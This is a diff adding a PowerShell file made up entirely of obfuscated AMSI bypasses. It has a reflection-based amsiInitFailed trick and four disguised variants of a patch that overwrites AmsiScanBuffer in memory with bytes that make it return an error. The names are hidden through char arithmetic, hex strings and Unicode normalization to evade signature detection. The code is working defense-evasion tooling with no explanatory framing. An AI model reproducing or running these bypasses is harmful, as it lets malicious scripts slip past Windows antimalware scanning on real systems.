@@ -1,1 +1,127 @@
 [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+
+---------------------------------------------------------------------
+
+$roflr = @"
+using System;
+using System.Runtime.InteropServices;
+public class roflr {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ccrvcj, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $roflr
+
+$smoibhc = [roflr]::LoadLibrary("$(('ämsì.d'+'ll').normALIZe([char]([BytE]0x46)+[ChAr]([byTe]0x6f)+[cHAR]([Byte]0x72)+[cHAr]([Byte]0x6d)+[ChAR](27+41)) -replace [chaR](92+8-8)+[cHaR](108+4)+[ChaR]([Byte]0x7b)+[CHar](77+10-10)+[cHar]([bYtE]0x6e)+[cHar]([bytE]0x7d))")
+$mqacvr = [roflr]::GetProcAddress($smoibhc, "$([cHaR]([BYtE]0x41)+[cHar](109)+[ChAr]([bYte]0x73)+[ChAR]([BYTE]0x69)+[char](83+56-56)+[ChAr](99+8-8)+[cHAR](97)+[CHAR]([bYte]0x6e)+[CHAr](23+43)+[cHAR]([BYtE]0x75)+[cHAR]([byTe]0x66)+[cHAr]([BYTe]0x66)+[cHar]([ByTe]0x65)+[cHAR]([ByTE]0x72))")
+$p = 0
+[roflr]::VirtualProtect($mqacvr, [uint32]5, 0x40, [ref]$p)
+$dsag = "0xB8"
+$viam = "0x57"
+$nonk = "0x00"
+$pewf = "0x07"
+$yuhz = "0x80"
+$qtod = "0xC3"
+$oclox = [Byte[]] ($dsag,$viam,$nonk,$pewf,+$yuhz,+$qtod)
+[System.Runtime.InteropServices.Marshal]::Copy($oclox, 0, $mqacvr, 6)
+
+----------------------------------------------------------------------
+
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$bclwj = @"
+using System;
+using System.Runtime.InteropServices;
+public class bclwj {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr soiuwo, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $bclwj
+
+$tmizvav = [bclwj]::LoadLibrary("$([chAR](97)+[ChAr]([byte]0x6d)+[CHAr](115)+[Char](105)+[ChAR]([bYTe]0x2e)+[cHaR]([Byte]0x64)+[chaR]([bytE]0x6c)+[cHar](108*77/77))")
+$pejwnb = [bclwj]::GetProcAddress($tmizvav, "$([cHaR](65)+[ChAR]([byTe]0x6d)+[cHaR]([ByTE]0x73)+[CHAr](52+53)+[chAR](83*28/28)+[chAr](99)+[cHar](79+18)+[CHaR](104+6)+[cHar](66)+[cHAr](117+83-83)+[chAr]([BytE]0x66)+[CHAr]([BYTE]0x66)+[CHaR](101*34/34)+[chAr]([ByTE]0x72))")
+$p = 0
+[bclwj]::VirtualProtect($pejwnb, [uint32]5, 0x40, [ref]$p)
+$sabz = "0xB8"
+$chis = "0x57"
+$iuhl = "0x00"
+$qwus = "0x07"
+$vykl = "0x80"
+$nygv = "0xC3"
+$mklio = [Byte[]] ($sabz,$chis,$iuhl,$qwus,+$vykl,+$nygv)
+[System.Runtime.InteropServices.Marshal]::Copy($mklio, 0, $pejwnb, 6)
+
+--------------------------------------------------------------------------
+
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$hfphg = @"
+using System;
+using System.Runtime.InteropServices;
+public class hfphg {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr hdwimy, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $hfphg
+
+$zfcrjil = [hfphg]::LoadLibrary("$(('ámsí.d'+'ll').noRmaLizE([ChaR](70+65-65)+[chAR](111)+[ChaR]([byte]0x72)+[Char](109*10/10)+[cHaR]([BYTe]0x44)) -replace [CHaR]([bytE]0x5c)+[cHaR]([Byte]0x70)+[Char](123)+[char](77*15/15)+[Char]([byTE]0x6e)+[chaR]([bYte]0x7d))")
+$utycdv = [hfphg]::GetProcAddress($zfcrjil, "$(('Àmsí'+'Scân'+'Buff'+'er').NOrMALIZe([ChAr]([bYte]0x46)+[cHaR]([byTe]0x6f)+[chAR]([byTE]0x72)+[chAR](109+27-27)+[cHaR]([BYTE]0x44)) -replace [cHAR](53+39)+[ChAr]([bYTE]0x70)+[ChAR](123*45/45)+[CHaR](77+66-66)+[chAR]([Byte]0x6e)+[CHAr](125))")
+$p = 0
+[hfphg]::VirtualProtect($utycdv, [uint32]5, 0x40, [ref]$p)
+$cfmj = "0xB8"
+$gara = "0x57"
+$dqly = "0x00"
+$jgzo = "0x07"
+$sinh = "0x80"
+$lfgj = "0xC3"
+$dcqqr = [Byte[]] ($cfmj,$gara,$dqly,$jgzo,+$sinh,+$lfgj)
+[System.Runtime.InteropServices.Marshal]::Copy($dcqqr, 0, $utycdv, 6)
+
+---------------------------------------------------------------------------
+
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$asqnu = @"
+using System;
+using System.Runtime.InteropServices;
+public class asqnu {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yuamma, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $asqnu
+
+$uuadbxu = [asqnu]::LoadLibrary("$(('àmsì'+'.dll').NOrmALiZE([chaR]([byTe]0x46)+[CHAr]([bYtE]0x6f)+[CHar](114+36-36)+[chAr]([BytE]0x6d)+[CHAr](53+15)) -replace [ChAR]([BYTE]0x5c)+[cHaR]([Byte]0x70)+[char](123)+[Char](77+59-59)+[cHaR]([Byte]0x6e)+[cHAR]([bYte]0x7d))")
+$wzhdub = [asqnu]::GetProcAddress($uuadbxu, "$([ChaR](65+39-39)+[cHAR](22+87)+[ChAR](115)+[CHAR](105+47-47)+[CHar]([BYTE]0x53)+[CHar](99*52/52)+[chAR]([BYtE]0x61)+[cHAr](110)+[ChAr]([BYte]0x42)+[cHAR](117*112/112)+[char](98+4)+[cHAR]([bytE]0x66)+[cHaR]([bytE]0x65)+[Char](114+106-106))")
+$p = 0
+[asqnu]::VirtualProtect($wzhdub, [uint32]5, 0x40, [ref]$p)
+$vvsu = "0xB8"
+$noom = "0x57"
+$mlcp = "0x00"
+$nbdq = "0x07"
+$maeq = "0x80"
+$ojda = "0xC3"
+$xitsc = [Byte[]] ($vvsu,$noom,$mlcp,$nbdq,+$maeq,+$ojda)
+[System.Runtime.InteropServices.Marshal]::Copy($xitsc, 0, $wzhdub, 6)
+
+-----------------------------------------------------------------------
+
